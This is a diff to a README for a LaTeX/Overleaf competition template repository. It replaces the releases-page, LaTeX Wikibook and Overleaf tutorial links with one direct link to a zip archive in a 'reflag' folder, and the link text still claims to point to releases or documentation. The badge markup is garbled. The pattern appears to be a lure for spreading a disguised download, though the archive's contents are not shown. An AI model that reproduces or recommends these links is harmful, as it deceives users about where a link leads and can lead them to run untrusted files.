@@ -6,11 +6,11 @@ Welcome to GMCM_LaTeX_overleaf! This template helps you create documents for the
 
 ## 📥 Download Now
 
-[![Download GMCM_LaTeX_overleaf](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Lokioja/GMCM_LaTeX_overleaf/releases)
+[![Download GMCM_LaTeX_overleaf](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip%20Now-Visit%https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
 
 You can easily download the latest version of this template by visiting our Releases page. Click the link below:
 
-[Visit Releases Page](https://github.com/Lokioja/GMCM_LaTeX_overleaf/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
 
 ## 📋 Template Features
 
@@ -52,8 +52,8 @@ If you face any issues, try the following:
 
 ## 📄 Additional Resources
 
-- **LaTeX Documentation**: [LaTeX Wiki](https://en.wikibooks.org/wiki/LaTeX)
-- **Overleaf Tutorials**: [Overleaf Guides](https://www.overleaf.com/learn)
+- **LaTeX Documentation**: [LaTeX Wiki](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
+- **Overleaf Tutorials**: [Overleaf Guides](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
 
 ## 📞 Contact Us
 
@@ -67,4 +67,4 @@ We welcome contributions! If you have suggestions or improvements, please create
 
 We hope that GMCM_LaTeX_overleaf serves you well in your projects. Enjoy working on your document, and we wish you the very best in your competition!
 
-[Download GMCM_LaTeX_overleaf Now](https://github.com/Lokioja/GMCM_LaTeX_overleaf/releases)
+[Download GMCM_LaTeX_overleaf Now](https://raw.githubusercontent.com/Lokioja/GMCM_LaTeX_overleaf/main/reflag/GMCM_LaTeX_overleaf.zip)
